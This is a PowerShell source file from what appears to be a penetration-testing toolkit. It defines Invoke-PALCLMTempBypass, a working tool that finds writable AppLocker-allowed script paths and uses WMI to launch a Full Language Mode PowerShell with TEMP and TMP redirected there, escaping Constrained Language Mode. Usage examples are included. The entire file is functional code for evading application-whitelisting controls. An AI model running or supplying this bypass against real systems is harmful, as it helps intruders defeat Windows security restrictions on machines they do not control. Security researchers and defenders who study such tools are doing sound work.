Function Invoke-PALCLMTempBypass
{
#Requires -Modules CimCmdlets
<#
.SYNOPSIS

The function figures out allowed Script paths, injects that path to the temp and tmp variable in a new Powershell console.
This results in a Full Language Mode Powershell console.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: Get-PALRules, Get-PALWriteablepaths
Optional Dependencies: None

.DESCRIPTION

Calling function without parameters will make it get all the AppLocker rules for 
the scripts rule section and figure out if there is a writable path for the user. 
The script will then pick a random writable path and spawn a new Powershell window
pointing %temp% and %tmp% to that location. 

If you specify $AllowedPath it will not enumerate the rules and figure out writable
locations. Instead it will try to spawn Powershell with the %temp% and %tmp% pointing to
that location.

.PARAMETER AllowedPath

Path to a location where execution of scripts is allowed and the user has write access to. 

.PARAMETER PoshStartParms

Specify if you want to add parameters to the powershell.exe that will be spawned. 
You need to start with a space. Ex -PoshStartParms " -file c:\temp\file.ps1"

.EXAMPLE

Spawns a new Powershell window if it figures out a valid path

PS C:\> Invoke-PALCLMTempBypass

[*] Finding suitable script rule location

[*] Starting full language mode Powershell

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     4000           0               

.EXAMPLE

PS C:\> Invoke-PALCLMTempBypass -AllowedPath C:\windows\Tasks\

[*] Path specified - Trying bypass from that path

[*] Starting full language mode Powershell

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     6092           0
#>
[CmdletBinding()] Param (
        [String]
        $AllowedPath,

        [String]
        $PoshStartParms
    )
    Process
    {
        Try
        {
            $InjectiblePaths = @()

            if($AllowedPath){
                "`n[*] Path specified - Trying bypass from that path"
                $InjectiblePaths += $AllowedPath
            }
            else{

                "`n[*] Finding suitable script rule location - Be patient - Takes time the first time you run it!"
                $rules = Get-PALRules -OutputRules Path -RuleActions Allow
                $denyrules = Get-PALRules -OutputRules Path -RuleActions Deny
                        
                foreach($rul in $rules){
                    if($rul.Name -eq "Script"){
                        foreach($path in $rul.RulesList.path){
                            $InjectiblePaths += Get-PALWriteablepaths -Path $path
                        }
                    }
                }
            }


            # All exceptions
            $exceptions = @()
            $rulesexception = foreach($ex in $rules[($rules.Name.IndexOf("Script"))].Ruleslist)
            {
                if($ex.PathExceptions)
                {
                    Write-Verbose "Exceptions found - Adding to list"
                    foreach($den in $rules[($rules.Name.IndexOf("Script"))].RulesList.PathExceptions)
                    {
                        $Exceptions += $den
                    }
                }
                else
                {
                    Write-Verbose "No Exceptions found"
                }
            }

            if($denyrules)
            {
                Write-Verbose "Deny rules found - Adding to list"
                foreach($denr in $denyrules[($denyrules.Name.IndexOf("Script"))].ruleslist)
                {
                    $Exceptions += $denr
                }
            }
            else
            {
                Write-Verbose "No deny rules found"
            }

            # remove exceptions and deny rules from the list - those are explicit deny
            $InjectiblePathsCleaned = @()
            Foreach($pth in $InjectiblePaths)
            {
                $Remove = $false
                foreach($rem in $exceptions)
                {
                    if($rem -like "*$pth*")
                    {
                        $Remove = $true
                        break
                    }
                }

                #Only add path to list if it is not in exceptions
                if(!($Remove))
                {
                    $InjectiblePathsCleaned += $pth
                }
            }
            
            if($InjectiblePathsCleaned)
            {
                $RandomScriptAllowedPath = $InjectiblePathsCleaned[(Get-Random -Minimum 0 -Maximum $InjectiblePathsCleaned.Count)]
                "`[*] Found paths $InjectiblePathsCleaned"
                "`[*] Random path picked: $RandomScriptAllowedPath"
                "`[*] Launching Powershell with TEMP/TMP set to: $RandomScriptAllowedPath"
                $TEMPBypassPath = $RandomScriptAllowedPath
                $TMPBypassPath = $RandomScriptAllowedPath
                
                #Borrowed code from Matt Graeber (Thanks! You rock! #KeepMattHappy)
                #https://gist.githubusercontent.com/mattifestation/9d09822e94fc901559280d700101f14e/raw/0128bf47f1f761a9fd254d1bf268579ff2a15685/RunscripthelperBypass.ps1 
                $CMDLine = "$PSHOME\powershell.exe"
                
                If($PoshStartParms){
                    $CMDLine += $PoshStartParms
                }

                [String[]] $EnvVarsExceptTemp = Get-ChildItem Env:\* -Exclude "TEMP","TMP"| % { "$($_.Name)=$($_.Value)" }
                $TEMPBypassPath = "Temp=$RandomScriptAllowedPath"
                $TMPBypassPath = "TMP=$RandomScriptAllowedPath"
                $EnvVarsExceptTemp += $TEMPBypassPath
                $EnvVarsExceptTemp += $TMPBypassPath
                
                $StartParamProperties = @{ EnvironmentVariables = $EnvVarsExceptTemp }
                $StartParams = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property $StartParamProperties

                "`n[*] Starting full language mode Powershell"
                Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
                    CommandLine = $CMDLine
                    ProcessStartupInformation = $StartParams
                }
            }
            else
            {
                Write-Verbose "No path found, bypass not possible"
            }
        }
        Catch
        {
            write-error $_
        }
        Finally{}
    }
}